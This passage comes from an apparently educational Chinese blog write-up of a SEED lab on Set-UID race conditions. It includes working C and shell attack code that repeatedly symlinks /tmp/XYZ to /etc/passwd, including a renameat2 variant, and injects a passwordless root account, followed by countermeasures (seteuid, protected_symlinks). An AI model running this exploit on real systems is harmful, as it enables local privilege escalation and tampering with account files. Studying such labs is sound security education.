+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;No permission </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>然后重新编译并设置为 Set-UID 程序</strong>，并创建一个 <code>/tmp/XYZ</code> 文件。</p>
+<p>运行程序时，输入 <code>test:U6aMy0wojraho:0:0:test:/root:/bin/bash</code>，利用 10 秒的时间窗口，将 <code>/tmp/XYZ</code> 设置为指向 <code>/etc/passwd</code> 的符号链接，使用命令：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ln -sf /etc/passwd /tmp/XYZ  <span class="o">(</span>f表示如果存在链接，则先删除链接<span class="o">)</span>
+</span></span></code></pre></div><p>如下所示：</p>
+<img src="https://s2.loli.net/2024/11/24/bvzuPeNjoIwahHJ.png" alt="image-20241124120831238" style="zoom:67%;" />
+<p>然后此时查看 <code>/etc/passwd</code> 的内容，发现 <code>test:U6aMy0wojraho:0:0:test:/root:/bin/bash</code> 已经被写入。</p>
+<img src="https://s2.loli.net/2024/11/24/x9iMm65HfZ2vB8I.png" alt="image-20241124121117226" style="zoom:67%;" />
+<p>切换 test 用户，无需密码即可获得 root 权限：</p>
+<img src="https://s2.loli.net/2024/11/24/j8uP9cK3LZvpJ7o.png" alt="image-20241124111737525" style="zoom:67%;" />
+<h3 id="32-task-2b进行真实攻击">3.2 Task 2.B：进行真实攻击<a hidden class="anchor" aria-hidden="true" href="#32-task-2b进行真实攻击">#</a></h3>
+<p>首先删除 <code>sleep(10)</code> 重新编译并设置成 Set-UID 程序。</p>
+<h4 id="321-编写攻击程序">3.2.1 编写攻击程序<a hidden class="anchor" aria-hidden="true" href="#321-编写攻击程序">#</a></h4>
+<p>我们可以使用以下的函数删除链接和创建链接：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">unlink</span><span class="p">(</span><span class="s">&#34;/tmp/XYZ&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">symlink</span><span class="p">(</span><span class="s">&#34;/etc/passwd&#34;</span><span class="p">,</span><span class="s">&#34;/tmp/XYZ&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><p>由于 Linux 不允许在已经存在链接的时候创建链接，所以我们每次在创建链接前都需要先删除链接。</p>
+<p>于是我们可以写出这样的攻击脚本：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// attack.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">	<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">unlink</span><span class="p">(</span><span class="s">&#34;/tmp/XYZ&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">symlink</span><span class="p">(</span><span class="s">&#34;/etc/passwd&#34;</span><span class="p">,</span><span class="s">&#34;/tmp/XYZ&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">usleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>通过一个 while 循环，不断的删除链接和创建 <code>tmp/XYZ</code> 和 <code>/etc/passwd</code> 之间的链接。</p>
+<p>然后编写 <code>target_process.sh</code> ，利用 echo 和管道符进行程序的输入。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="nv">CHECK_FILE</span><span class="o">=</span><span class="s2">&#34;ls -l /etc/passwd&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">old</span><span class="o">=</span><span class="k">$(</span><span class="nv">$CHECK_FILE</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">new</span><span class="o">=</span><span class="k">$(</span><span class="nv">$CHECK_FILE</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$old</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;</span><span class="nv">$new</span><span class="s2">&#34;</span> <span class="o">]</span>  
+</span></span><span class="line"><span class="cl"><span class="k">do</span>
+</span></span><span class="line"><span class="cl">   <span class="nb">echo</span> <span class="s2">&#34;test:U6aMy0wojraho:0:0:test:/root:/bin/bash&#34;</span> <span class="p">|</span> ./vulp 
+</span></span><span class="line"><span class="cl">   <span class="nv">new</span><span class="o">=</span><span class="k">$(</span><span class="nv">$CHECK_FILE</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;STOP... The passwd file has been changed&#34;</span>
+</span></span></code></pre></div><p>利用 <code>ls -l /etc/passwd</code> 输出的文件修改时间，如果文件修改时间发生变化，说明竞争条件漏洞利用成功，<code>/etc/passwd</code> 文件被修改，此时停止脚本的运行。</p>
+<h4 id="322-运行漏洞程序并观察结果">3.2.2 运行漏洞程序并观察结果<a hidden class="anchor" aria-hidden="true" href="#322-运行漏洞程序并观察结果">#</a></h4>
+<ol>
+<li>首先运行 <code>attack</code> 攻击脚本。</li>
+<li>然后运行  <code>target_process.sh</code> 脚本，不断的运行漏洞程序。</li>
+</ol>
+<img src="https://s2.loli.net/2024/11/24/LaXAbQIgqtz7khs.png" alt="image-20241124144521009" style="zoom: 50%;" />
+<h4 id="323-验证是否成功">3.2.3 验证是否成功<a hidden class="anchor" aria-hidden="true" href="#323-验证是否成功">#</a></h4>
+<p>查看 <code>/etc/passwd</code> ，发现 <code>test:U6aMy0wojraho:0:0:test:/root:/bin/bash </code> 成功写入：</p>
+<img src="https://s2.loli.net/2024/11/24/QUCFs4VDZG3vjmI.png" alt="image-20241124144843800" style="zoom: 50%;" />
+<p>切换 test 用户，无需密码成功获得 root 权限：</p>
+<img src="https://s2.loli.net/2024/11/24/j8uP9cK3LZvpJ7o.png" alt="image-20241124111737525" style="zoom: 50%;" />
+<h3 id="33--task-2c一种改进的攻击方法">3.3  Task 2.C：一种改进的攻击方法<a hidden class="anchor" aria-hidden="true" href="#33--task-2c一种改进的攻击方法">#</a></h3>
+<p>在 Task 2.B 中，我们的攻击可能失败，原因是我们编写的攻击脚本也存在着竞争条件漏洞，当执行 unlink 操作删除 <code>/tmp/XYZ</code> 之后，如果执行了 fopen 操作，就会创建一个所有者为 root 的 <code>/tmp/XYZ</code> ，下一次 unlink 操作就无法删除 <code>/tmp/XYZ</code>。这是因为 <code>/tmp </code>文件夹上有一个“粘滞”位，意为只有文件的所有者才能删除该文件，即使该文件夹可写。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// attack.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">unlink</span><span class="p">(</span><span class="s">&#34;/tmp/XYZ&#34;</span><span class="p">);</span>  <span class="o">&lt;-</span> <span class="err">以</span> <span class="n">seed</span> <span class="err">身份</span> <span class="n">unlink</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// vulp.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="s">&#34;a+&#34;</span><span class="p">);</span> <span class="o">&lt;-</span> <span class="err">以</span> <span class="n">root</span> <span class="err">身份</span> <span class="n">fopen</span><span class="err">，文件所有者变为</span> <span class="n">root</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// attack.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">unlink</span><span class="p">(</span><span class="s">&#34;/tmp/XYZ&#34;</span><span class="p">);</span>  <span class="o">&lt;-</span> <span class="err">以</span> <span class="n">seed</span> <span class="err">身份无法</span> <span class="n">unlink</span>
+</span></span></code></pre></div><p>为了解决这个问题，我们需要将 <code>unlink</code> 和 <code>symlink</code> 操作原子化，幸运的是，有一个系统调用允许我们实现这一点。更准确地说，它允许我们原子地交换两个符号链接。下面的程序首先创建两个符号链接 <code>/tmp/XYZ</code> 和 <code>/tmp/ABC</code>，然后使用 <code>renameat2 </code>系统调用来原子地交换它们。这允许我们在不引入任何竞争条件的情况下更改 <code>/tmp/XYZ</code> 指向的内容。</p>
+<p>我们可以写入如下所示的改进的攻击脚本：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//attack_new.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define _GNU_SOURCE
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span> <span class="o">=</span> <span class="n">RENAME_EXCHANGE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">unlink</span><span class="p">(</span><span class="s">&#34;/tmp/XYZ&#34;</span><span class="p">);</span> <span class="nf">symlink</span><span class="p">(</span><span class="s">&#34;/dev/null&#34;</span><span class="p">,</span> <span class="s">&#34;/tmp/XYZ&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">usleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">unlink</span><span class="p">(</span><span class="s">&#34;/tmp/ABC&#34;</span><span class="p">);</span> <span class="nf">symlink</span><span class="p">(</span><span class="s">&#34;/etc/passwd&#34;</span><span class="p">,</span> <span class="s">&#34;/tmp/ABC&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">usleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">renameat2</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#34;/tmp/XYZ&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;/tmp/ABC&#34;</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>使用上面的攻击脚本再次尝试攻击：</p>
+<img src="https://s2.loli.net/2024/11/24/yWIzpkNLuZq29Jj.png" alt="image-20241124152915353" style="zoom:67%;" />
+<p>切换 test 用户，无需密码成功获得 root 权限：</p>
+<img src="https://s2.loli.net/2024/11/24/UNsXfZg5QvbDKMu.png" alt="image-20241124153028071" style="zoom:67%;" />
+<h2 id="4-task-3预防措施">4. Task 3：预防措施<a hidden class="anchor" aria-hidden="true" href="#4-task-3预防措施">#</a></h2>
+<h3 id="41-task-3a应用最小权限原则">4.1 Task 3.A：应用最小权限原则<a hidden class="anchor" aria-hidden="true" href="#41-task-3a应用最小权限原则">#</a></h3>
+<p>读取 <code>/tmp/XYZ</code> 文件并不需要 root 权限，根据最小权限原则，如果我们不需要 root 权限，我们就要禁用这个权限，因此我们可以使用 <code>seteuid</code> 系统调用暂时禁用 root 权限，确保<strong>进程的权限与当前执行者的权限一致</strong>，修改后的代码如下所示：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">fn</span> <span class="o">=</span> <span class="s">&#34;/tmp/XYZ&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">60</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span><span class="o">*</span> <span class="n">fp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">seteuid</span><span class="p">(</span><span class="nf">getuid</span><span class="p">());</span>  <span class="c1">//修改进程的euid为执行者的uid
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="cm">/* get user input */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%50s&#34;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">access</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="n">W_OK</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="s">&#34;a+&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;Open failed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fwrite</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fwrite</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;No permission </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>编译并设为 Set-UID 程序，再次执行攻击脚本。</p>
+<p>**观察结果：**发现攻击失败，出现了 Open failed: Permission denied。</p>
+<img src="https://s2.loli.net/2024/11/24/nwy1dxZMjpWc9FC.png" alt="image-20241124155942883" style="zoom: 50%;" />
+<p>**解释：**由于进程的 euid 被设置成了 seed ，通过了 <code>access()</code> 函数的检测之后，就算修改了符号链接，也无法打开 <code>/etc/passwd</code> ，原因是 <code>/etc/passwd</code> 是  root 可写的，seed 不可写，因此会输出 Open failed: Permission denied。</p>
+<h3 id="42-task-3b使用-ubuntu-内置方案">4.2 Task 3.B：使用 Ubuntu 内置方案<a hidden class="anchor" aria-hidden="true" href="#42-task-3b使用-ubuntu-内置方案">#</a></h3>
+<p>Ubuntu 10.10 和更高版本附带了一个内置的防止竞争条件攻击的保护方案。使用下面的命令重新开启保护：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">// On Ubuntu 16.04 and 20.04, use the following command:
+</span></span><span class="line"><span class="cl">$ sudo sysctl -w fs.protected_symlinks<span class="o">=</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">// On Ubuntu 12.04, use the following command:
+</span></span><span class="line"><span class="cl">$ sudo sysctl -w kernel.yama.protected_sticky_symlinks<span class="o">=</span><span class="m">1</span>
+</span></span></code></pre></div><img src="https://s2.loli.net/2024/11/24/ZXYNhG8dRsJwfCp.png" alt="image-20241124160824321" style="zoom:67%;" />
+<p>再次运行攻击脚本。</p>
+<p>**观察结果：**发现攻击失败，输出 Open failed: Permission denied。</p>
+<img src="https://s2.loli.net/2024/11/24/YpJeujbG1zESBfk.png" alt="image-20241124162012143" style="zoom:67%;" />
+<p>查阅 Linux Kernel 的文档（https://www.kernel.org/doc/html/latest/admin-guide/sysctl/fs.html#protected-symlinks）发现了该保护方案的机制：</p>
+<p><img loading="lazy" src="https://s2.loli.net/2024/11/24/C3Ii4WqzlusPEdj.png" alt="image-20241124162204358"  />
+</p>
+<blockquote>
+<p><strong>Q:</strong>（1）该保护方案是如何工作的？</p>
+</blockquote>
+<p><strong>A：</strong></p>
+<p>结合 Linux Kernel 的文档和 SEED book，设这样一个三元组：（跟随者，目录所有者，符号链接所有者），跟随者是进程的有效用户，目录所有者是目录的拥有者，符号链接所有者是创建该符号链接的用户，当符号链接的所有者与跟随者相同，或者与目录所有者相同，fopen 的操作就会被允许，否则 fopen 的操作就会失败。</p>
+<p>发起攻击的时候，符号链接的所有者是 seed，而 /tmp 目录的所有者和跟随者都是 root，因此 fopen 的操作会失败，所以会输出 Open failed: Permission denied，进而攻击失败。</p>
+<blockquote>
+<p><strong>Q:</strong>（2）这个方案有什么局限性？</p>
+</blockquote>
+<p><strong>A：</strong></p>
+<ol>
+<li>如果建立符号链接的文件所在目录的所有者是 seed，那么这个保护机制将会失败。</li>
+<li>限制了系统的灵活性，如果一个 root 用户想通过一个程序访问一个 root 拥有的目录下的 seed 拥有的符号链接，那么就会访问失败。</li>
+<li>在某些场景下可能带来兼容性问题，如果其他程序依赖不同用户下的符号链接机制，这个程序可能无法正常运行。</li>
+</ol>
+<h2 id="5-思考题">5. 思考题<a hidden class="anchor" aria-hidden="true" href="#5-思考题">#</a></h2>
+<p><strong>Q1</strong>	下面的 Set-UID 程序是否有竞争条件漏洞？并请解释。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">access</span><span class="p">(</span><span class="s">&#34;/etc/passwd&#34;</span><span class="p">,</span> <span class="n">W_OK</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* the real user has the write permission*/</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/tmp/X&#34;</span><span class="p">,</span> <span class="n">O_WRITE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">write_to_file</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* the real user does not have the write permission */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span> <span class="p">,</span> <span class="s">&#34;Permission denied</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>存在竞争条件漏洞。</p>
+<p><strong>解释</strong>：首先，if 判断会检查用户对 /etc/passwd 是否有写权限，而且 <code>access()</code> 函数检查的是用户的真实 id，并且普通用户是无法将 /etc/passwd 设置符号链接的，所以能通过 if 判断的都是 root 用户，这让我感到迷惑，都拥有 root 权限了，还需要通过修改符号链接的方式进行攻击吗？</p>
+<p>通过了 if 判断后，攻击者可以将 /tmp/X 设置为指向攻击者想要写入的文件的符号链接，这样执行open 就会打开攻击者想要写入的文件，并执行 <code>write_to_file(f)</code> 对该文件进行写入。</p>
+<p>存在漏洞的原因是检查文件和打开文件是两个分离的操作，攻击者可以利用中间的时间窗口对文件进行替换，进行攻击。</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://smera1d0.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/">软件安全</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://smera1d0.github.io/posts/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8-linear-regression-%E9%A2%84%E6%B5%8B-pm2.5-%E6%95%B0%E5%80%BC/">
+    <span class="title">« 上一页</span>
+    <br>
+    <span>【机器学习】使用 Linear Regression 预测 PM2.5 数值</span>
+  </a>
+  <a class="next" href="https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C-7--%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8%E5%AE%9E%E9%AA%8C/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>SEEDlab—密码技术应用实验</span>
+  </a>
+</nav>
+
+  </footer><script src="https://giscus.app/client.js"
+        data-repo="Smera1d0/Smera1d0.github.io"
+        data-repo-id="R_kgDOIXSe_Q"
+        data-category="Announcements"
+        data-category-id="DIC_kwDOIXSe_c4CmMtR"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+</script>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>© <a href="https://github.com/adityatelange/hugo-PaperMod/graphs/contributors">PaperMod Contributors</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
